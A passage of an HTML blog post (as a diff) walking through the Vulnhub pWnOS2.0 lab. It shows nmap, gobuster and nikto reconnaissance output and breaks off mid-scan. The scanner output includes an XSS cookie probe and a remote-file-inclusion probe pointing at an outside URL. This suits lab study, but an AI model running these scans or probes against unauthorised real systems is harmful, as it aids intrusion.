@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="一个简单的靶机~ 靶机下载链接">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub-pWnOS2.0">
+<meta property="og:url" content="http://atsud0.me/2020/07/11/Vulnhub-pWnOS2/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="一个简单的靶机~ 靶机下载链接">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200711_220231.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200711_220342.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200711_220536.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200711_220631.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200711_221545.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200711_222118.jpg">
+<meta property="article:published_time" content="2020-07-11T15:18:33.000Z">
+<meta property="article:modified_time" content="2021-02-23T15:38:50.480Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="sql-injection">
+<meta property="article:tag" content="CVE-2013-2094">
+<meta property="article:tag" content="simple php blog">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/Screenshot_20200711_220231.jpg">
+
+<link rel="canonical" href="http://atsud0.me/2020/07/11/Vulnhub-pWnOS2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>Vulnhub-pWnOS2.0 | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/07/11/Vulnhub-pWnOS2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Vulnhub-pWnOS2.0
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-07-11 23:18:33" itemprop="dateCreated datePublished" datetime="2020-07-11T23:18:33+08:00">2020-07-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-23 23:38:50" itemprop="dateModified" datetime="2021-02-23T23:38:50+08:00">2021-02-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">靶机实验</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/Vulnhub/" itemprop="url" rel="index"><span itemprop="name">Vulnhub</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>13k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>12 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>一个简单的靶机~</p>
+<p><a href="https://www.vulnhub.com/entry/pwnos-20-pre-release,34/" target="_blank" rel="noopener">靶机下载链接</a></p>
+<a id="more"></a>
+
+<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 10.10.10.100 -sC -sV -T5</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-11 20:18 CST</span><br><span class="line">Nmap scan report for 10.10.10.100</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)</span><br><span class="line">|   2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)</span><br><span class="line">|_  256 10:12:64:4b:7d:ff:6a:87:37:26:38:b1:44:9f:cf:5e (ECDSA)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.2.17 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   &#x2F;: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache&#x2F;2.2.17 (Ubuntu)</span><br><span class="line">|_http-title: Welcome to this Site!</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.07 seconds</span><br></pre></td></tr></table></figure>
+
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;activate (Status: 302)</span><br><span class="line">&#x2F;activate.php (Status: 302)</span><br><span class="line">&#x2F;blog (Status: 301)</span><br><span class="line">&#x2F;cgi-bin&#x2F; (Status: 403)</span><br><span class="line">&#x2F;includes (Status: 301)</span><br><span class="line">&#x2F;index (Status: 200)</span><br><span class="line">&#x2F;index.php (Status: 200)</span><br><span class="line">&#x2F;info (Status: 200)</span><br><span class="line">&#x2F;info.php (Status: 200)</span><br><span class="line">&#x2F;login (Status: 200)</span><br><span class="line">&#x2F;login.php (Status: 200)</span><br><span class="line">&#x2F;register (Status: 200)</span><br><span class="line">&#x2F;register.php (Status: 200)</span><br><span class="line">&#x2F;server-status (Status: 403)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">2020&#x2F;07&#x2F;11 21:56:15 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;add (Status: 302)</span><br><span class="line">&#x2F;atom (Status: 200)</span><br><span class="line">&#x2F;categories (Status: 302)</span><br><span class="line">&#x2F;colors (Status: 302)</span><br><span class="line">&#x2F;config (Status: 301)</span><br><span class="line">&#x2F;comments (Status: 302)</span><br><span class="line">&#x2F;content (Status: 301)</span><br><span class="line">&#x2F;contact (Status: 200)</span><br><span class="line">&#x2F;delete (Status: 302)</span><br><span class="line">&#x2F;docs (Status: 301)</span><br><span class="line">&#x2F;flash (Status: 301)</span><br><span class="line">&#x2F;images (Status: 301)</span><br><span class="line">&#x2F;interface (Status: 301)</span><br><span class="line">&#x2F;info (Status: 302)</span><br><span class="line">&#x2F;index (Status: 200)</span><br><span class="line">&#x2F;languages (Status: 301)</span><br><span class="line">&#x2F;login (Status: 200)</span><br><span class="line">&#x2F;logout (Status: 302)</span><br><span class="line">&#x2F;options (Status: 302)</span><br><span class="line">&#x2F;rdf (Status: 200)</span><br><span class="line">&#x2F;scripts (Status: 301)</span><br><span class="line">&#x2F;rss (Status: 200)</span><br><span class="line">&#x2F;setup (Status: 302)</span><br><span class="line">&#x2F;static (Status: 302)</span><br><span class="line">&#x2F;themes (Status: 301)</span><br><span class="line">&#x2F;trackback (Status: 302)</span><br><span class="line">&#x2F;search (Status: 200)</span><br><span class="line">&#x2F;upload_img (Status: 302)</span><br><span class="line">&#x2F;upgrade (Status: 302)</span><br><span class="line">&#x2F;stats (Status: 200)</span><br></pre></td></tr></table></figure>
+
+<h3 id="nikto扫描"><a href="#nikto扫描" class="headerlink" title="nikto扫描"></a>nikto扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">nikto -h http:&#x2F;&#x2F;10.10.10.100</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          10.10.10.100</span><br><span class="line">+ Target Hostname:    10.10.10.100</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-07-11 20:18:33 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache&#x2F;2.2.17 (Ubuntu)</span><br><span class="line">+ Retrieved x-powered-by header: PHP&#x2F;5.3.5-1ubuntu7</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ Cookie PHPSESSID created without the httponly flag</span><br><span class="line">+ Uncommon header &#39;tcn&#39; found, with contents: list</span><br><span class="line">+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http:&#x2F;&#x2F;www.wisec.it&#x2F;sectou.php?id&#x3D;4698ebdc59d15. The following alternatives for &#39;index&#39; were found: index.php</span><br><span class="line">+ Apache&#x2F;2.2.17 appears to be outdated (current is at least Apache&#x2F;2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.</span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span><br><span class="line">+ OSVDB-12184: &#x2F;?&#x3D;PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: &#x2F;?&#x3D;PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: &#x2F;?&#x3D;PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: &#x2F;?&#x3D;PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-3268: &#x2F;includes&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: &#x2F;includes&#x2F;: This might be interesting...</span><br><span class="line">+ &#x2F;info&#x2F;: Output from the phpinfo() function was found.</span><br><span class="line">+ OSVDB-3092: &#x2F;info&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3092: &#x2F;login&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3092: &#x2F;register&#x2F;: This might be interesting...</span><br><span class="line">+ &#x2F;info.php: Output from the phpinfo() function was found.</span><br><span class="line">+ OSVDB-3233: &#x2F;info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.</span><br><span class="line">+ OSVDB-3268: &#x2F;icons&#x2F;: Directory indexing found.</span><br><span class="line">+ Server leaks inodes via ETags, header found with file &#x2F;icons&#x2F;README, inode: 1311031, size: 5108, mtime: Tue Aug 28 18:48:10 2007</span><br><span class="line">+ OSVDB-3233: &#x2F;icons&#x2F;README: Apache default file found.</span><br><span class="line">+ &#x2F;info.php?file&#x3D;http:&#x2F;&#x2F;cirt.net&#x2F;rfiinc.txt?: Output from the phpinfo() function was found.</span><br><span class="line">+ OSVDB-5292: &#x2F;info.php?file&#x3D;http:&#x2F;&#x2F;cirt.net&#x2F;rfiinc.txt?: RFI from RSnake&#39;s list (http:&#x2F;&#x2F;ha.ckers.org&#x2F;weird&#x2F;rfi-locations.dat) or from http:&#x2F;&#x2F;osvdb.org&#x2F;</span><br><span class="line">+ &#x2F;login.php: Admin login page&#x2F;section found.</span><br><span class="line">+ 8310 requests: 0 error(s) and 27 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-07-11 20:18:49 (GMT8) (16 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">nikto -h http:&#x2F;&#x2F;10.10.10.100&#x2F;blog</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          10.10.10.100</span><br><span class="line">+ Target Hostname:    10.10.10.100</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-07-11 20:51:51 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache&#x2F;2.2.17 (Ubuntu)</span><br><span class="line">+ Retrieved x-powered-by header: PHP&#x2F;5.3.5-1ubuntu7</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ OSVDB-3268: &#x2F;blog&#x2F;scripts&#x2F;: Directory indexing found.</span><br><span class="line">+ Uncommon header &#39;tcn&#39; found, with contents: list</span><br><span class="line">+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http:&#x2F;&#x2F;www.wisec.it&#x2F;sectou.php?id&#x3D;4698ebdc59d15. The following alternatives for &#39;index&#39; were found: index.php</span><br><span class="line">+ Apache&#x2F;2.2.17 appears to be outdated (current is at least Apache&#x2F;2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS </span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span><br><span class="line">+ DEBUG HTTP verb may show server debugging information. See http:&#x2F;&#x2F;msdn.microsoft.com&#x2F;en-us&#x2F;library&#x2F;e8z01xdh%28VS.80%29.aspx for details.</span><br><span class="line">+ &#x2F;blog&#x2F;index.php&#x2F;\&quot;&gt;&lt;script&gt;&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;&lt;: eZ publish v3 and prior allow Cross Site Scripting (XSS). http:&#x2F;&#x2F;www.cert.org&#x2F;advisories&#x2F;CA-2000-02.html.</span><br><span class="line">+ OSVDB-3268: &#x2F;blog&#x2F;config&#x2F;: Directory indexing found.</span><br><span class="line">+ &#x2F;blog&#x2F;config&#x2F;: Configuration information may be available remotely.</span><br><span class="line">+ OSVDB-12184: &#x2F;blog&#x2F;?&#x3D;PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: &#x2F;blog&#x2F;?&#x3D;PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: &#x2F;blog&#x2F;?&#x3D;PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: &#x2F;blog&#x2F;?&#x3D;PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-3092: &#x2F;blog&#x2F;login&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3092: &#x2F;blog&#x2F;stats&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3092: &#x2F;blog&#x2F;scripts&#x2F;: This might be interesting... possibly a system shell found.</span><br><span class="line">+ OSVDB-3268: &#x2F;blog&#x2F;images&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3268: &#x2F;blog&#x2F;docs&#x2F;: 